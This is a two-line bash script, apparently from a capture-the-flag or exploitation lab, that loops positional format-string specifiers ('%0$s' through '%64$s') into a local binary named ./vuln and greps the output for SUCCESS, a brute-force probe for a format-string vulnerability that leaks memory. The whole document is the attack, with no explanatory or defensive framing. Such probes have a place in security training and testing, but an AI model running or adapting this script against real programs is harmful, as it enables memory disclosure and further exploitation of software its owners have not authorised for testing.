#!/bin/bash
for i in {0..64}; do echo "%$i\$s" | ./vuln | grep SUCCESS; done
